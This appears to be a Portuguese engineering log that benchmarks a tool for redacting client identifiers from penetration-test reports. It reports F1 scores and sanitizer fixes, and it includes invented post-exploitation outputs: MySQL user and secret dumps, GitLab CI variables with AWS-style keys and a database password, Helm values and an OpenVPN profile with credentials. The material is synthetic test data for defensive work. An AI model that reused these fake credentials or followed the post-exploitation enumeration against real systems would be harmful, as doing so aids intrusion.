**hydra:** creds/host ok; `hydra` → `PERSON_8`; form `/users/sign_in:…^USER^…^PASS^` lido como Impacket `DOMAIN/user:pass`.

Esta fase **não bate 95%** nos outputs. Reconstruct bate.

### 5.5 Fixes (não é benchmark)

| Erro da 1ª cola | Onde | Correção |
|-----------------|------|----------|
| `hydra` → PERSON | `sanitize.py` + `global_allow.json` | allow técnico (nome mitológico ≠ pessoa) |
| `/users/sign_in:form` como Impacket | `sanitize.py` | `(?<!/)` no `DOMAIN/user:pass`; form com `=`/`&`/`[` não é senha Impacket |
| `^USER^` / `^PASS^` | `sanitize.py` | marcador hydra, não credencial |
| `sign_in` / `sign_up` | `USERS_NAO_LOGIN` | path HTTP, não login |
| `nxl_app` já no mapa vazou na tabela | `sanitize.py` | replay do `entity_mapping` no próximo PAST INPUT |
| dump `mysql.user` / `mysql_sql` | `sanitize.py` | 1ª coluna = login; host `10.8.4.%` = IP curinga MySQL |
| Questions no Redactor com texto longo | `ui/dialogs.py` | msg aponta Mask para reconstruct pequeno; PAST REPORT continua ok se errar a aba |

Nota (não comparar): reteste PAST INPUT dos três outputs **passa**. mysql: `nxl_app`/`nxl_repl`/`10.8.4.%` → `TARGET_USER_9`/`TARGET_USER_11`/`TARGET_IP_10`; `root`/`localhost`/`backup` intactos. GitLab: token/host/marca ok; repos intactos. hydra: tool + form `sign_in`/`^USER^`/`^PASS^` intactos; creds/host tapados. F1 oficial permanece reconstruct **100%** / outputs **~75%**.

---

## Mapa oficial deste eng (só 1ª cola)

| Fase | Tools | F1 |
|------|--------|-----|
| 1 IG passivo | whois, dig, gitleaks | **87%** |
| 2 IG ativo | nmap, WhatWeb, openssl/curl | **~95%** |
| 3 Enum | smtp-user-enum, gobuster, GitLab API | **79%** |
| 4 Vuln | curl .env/debug, nuclei | **97%** |
| Redactor | PAST REPORT F-01/F-02 | **100%** |
| 5 Exploitation reconstruct | Questions Mask (3 presets) | **100%** |
| 5 Exploitation outputs | PAST INPUT (mysql, GitLab token, hydra) | **~75%** |
| 6 Post-exploitation | mysql follow-up, GitLab CI vars, Helm, OpenVPN | **~89%** |

Barra de lançamento (**≥95% na 1ª cola**): este eng **não cumpre** no passivo, na enum, nos outputs de exploitation nem na post-ex. Ativo, vuln, Redactor e reconstruct de comando já estão na faixa.

**`blocked=` / `allowed=`:** zero usos. Único candidato avisado: `nxl_edge`.

---

## Fase 6 — Post-exploitation (enum interna)

Só **saídas** (sem presets/comandos). Origem: sessão MySQL `nxl_app`, token GitLab nos repos `prod-secrets` / `vpn-profiles`, range `10.8.4.%`.  
Mask / PAST INPUT, um de cada vez, sem ACEPT até validar. Benchmark: 1ª cola.

### 6.1 Bloco mysql — databases / users / secrets (inventado)

```
[*] 10.8.4.33:3306 - SHOW DATABASES
Database
information_schema
mysql
nxl_edge
nxl_audit
performance_schema

[*] 10.8.4.33:3306 - SELECT id,email,role,last_ip FROM nxl_edge.users
    id  email                      role     last_ip
    1   helena.voss@nyxlynx.io     owner    10.8.4.21
    2   hvoss@nyxlynx.io           sre      10.8.4.21
    3   tkade@nyxlynx.io           admin    10.8.4.8
    4   mira.solano@nyxlynx.io     dev      10.8.4.45
    7   deploy@nyxlynx.io          ci       10.8.4.21

[*] 10.8.4.33:3306 - SELECT k,v FROM nxl_edge.app_secrets
    k              v
    stripe_sk      sk_live_[EXAMPLE_NYXLYNX]
    redis_host     redis01.nyxlynx.internal
    session_hmac   nXl8Qm2pL4vXzYwC1aB9dE3fG6hJ7==
```

### 6.2 Bloco GitLab — CI/CD variables de prod-secrets (inventado)

```
[{"key":"AWS_ACCESS_KEY_ID","value":"AKIAIOSFODNN7EXAMPLE","protected":true,"masked":true},
{"key":"AWS_SECRET_ACCESS_KEY","value":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY","protected":true,"masked":true},
{"key":"DATABASE_URL","value":"mysql://nxl_app:Lynx#Edge2024!@db01.nyxlynx.internal:3306/nxl_edge","protected":true},
{"key":"SLACK_WEBHOOK","value":"https://hooks.slack.com/services/EXAMPLE/FAKE/nyxlynx-test","protected":false},
{"key":"KUBE_API","value":"https://k8s-prod.nyxlynx.internal:6443","protected":true}]
```

### 6.3 Bloco Helm — values-prod.yaml (inventado)

```
# values-prod.yaml — Helm values, do not clone to laptops
global:
  domain: nyxlynx.io
  clientName: NyxLynx
  replicaCount: 3
mysql:
  host: db01.nyxlynx.internal
  database: nxl_edge
  username: nxl_app
  password: Lynx#Edge2024!
redis:
  host: redis01.nyxlynx.internal
  port: 6379
ingress:
  className: nginx
  tls:
    - hosts:
        - "*.nyxlynx.io"
        - git.nyxlynx.io
image:
  repository: registry.nyxlynx.internal/edge-gateway
  tag: 1.8.4
```

### 6.4 Bloco OpenVPN — client.ovpn do vpn-profiles (inventado)

```
client
dev tun
proto udp
remote vpn.nyxlynx.io 1194
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
verify-x509-name gw01.nyxlynx.internal name
route 10.8.4.0 255.255.255.0
dhcp-option DNS 10.8.4.8
dhcp-option DOMAIN nyxlynx.internal
auth-user-pass
# auth-user-pass file: hvoss / Harbor-Lynx-09
<ca>
-----BEGIN CERTIFICATE-----
MIIFakeNyxLynxVPNCA00
-----END CERTIFICATE-----
</ca>
```

### 6.5 Benchmark oficial — 1ª cola

| Tool | Cobertura | Precisão | F1 |
|------|-----------|----------|-----|
| mysql follow-up | 79% | 100% | **88%** |
| GitLab CI variables | 75% | 100% | **86%** |
| Helm values-prod | 89% | 89% | **89%** |
| OpenVPN client.ovpn | 100% | 88% | **93%** |
| **Fase 6 (oficial)** | **86%** | **94%** | **~89%** |

**mysql:** e-mails, IPs novos (`10.8.4.8` / `.45`), `sk_live_`, `redis01` ok; `information_schema` / roles intactos. **Vazou:** corpo do `session_hmac` (mesmo secret do `APP_KEY` sem prefixo `base64:`); `nxl_edge` / `nxl_audit`.  
**GitLab CI:** AWS keys, user/senha/host do `DATABASE_URL`, `k8s-prod` ok; chaves JSON intactas. **Vazou:** webhook Slack; `nxl_edge` no path. Rótulo: `AKIA…` → `TARGET_PASS_2` (mascarado).  
**Helm:** hosts/senha/marca ok; `nginx` / `edge-gateway` / tag intactos. **Vazou:** `nxl_edge`. **FP:** `Helm` → `CLIENT_NAME_8`; `*.nyxlynx.io` → `*TARGET_DOMAIN_16` (mapa sujo / ponto).  
**OpenVPN:** host/VPN/creds ok; diretivas intactas. **FP:** netmask `255.255.255.0` → `TARGET_IP_14`. Rótulo: `nyxlynx.internal` → `CLIENT_NAME_5.internal`. Residual: `NyxLynx` dentro do PEM fake.

Sem `blocked=` nesta cola. `nxl_edge` / `nxl_audit` continuam candidatos manuais.

### 6.6 Fixes (não é benchmark)

| Erro da 1ª cola | Onde | Correção |
|-----------------|------|----------|
| Slack `hooks.slack.com/services/…` | `sanitize.py` | token de webhook = APIKEY (classe SaaS, como `glpat-`) |
| `Helm` → CLIENT_NAME | allow técnico | jargão CNCF, igual `hydra` |
| `255.255.255.0` como IP | `sanitize.py` | netmask/localhost fora do IPv4 de cliente |
| `*.domínio` → `*TARGET_` | `sanitize.py` | span FQDN no host normalizado; mapa não replay de `*.` / `.host` |
| `NyxLynx.internal` via marca | `sanitize.py` | CLIENT_NAME não come FQDN; ORG/PERSON do mapa/blocklist não ganham se o próximo char é `.` (deixa o host inteiro para DOMAIN) |
| `session_hmac` = APP_KEY sem `base64:` | `sanitize.py` | replay do mapa também pelo valor depois de `base64:` |

`nxl_edge` / `nxl_audit`: sem classe estável — **não** entram no fonte. Candidato `blocked=` se Kiron quiser.

Nota (não comparar): 1º reteste — Slack webhook, `session_hmac`, `Helm`, netmask `255.255.255.0` e `*.TARGET_DOMAIN_1` **fecharam**. Sobra: `nxl_edge` / `nxl_audit` (sem classe; `blocked=` se quiser). Ovpn vazou `nyxlynx.internal` (marca do mapa ganhava do FQDN) — remendo extra no código; reteste **só do PE-4** pendente. F1 oficial permanece **~89%**.

---

## Fechamento deste eng (13/09/2026)

Eng **fechado** após post-ex. Cleanup não foi simulado: são comandos de higiene sem output identificável novo — fora do benchmark do Mask.

Este arquivo é a **carta oficial** do primeiro eng completo (Mask + Redactor + exploitation + post-ex) com F1 só da 1ª cola.
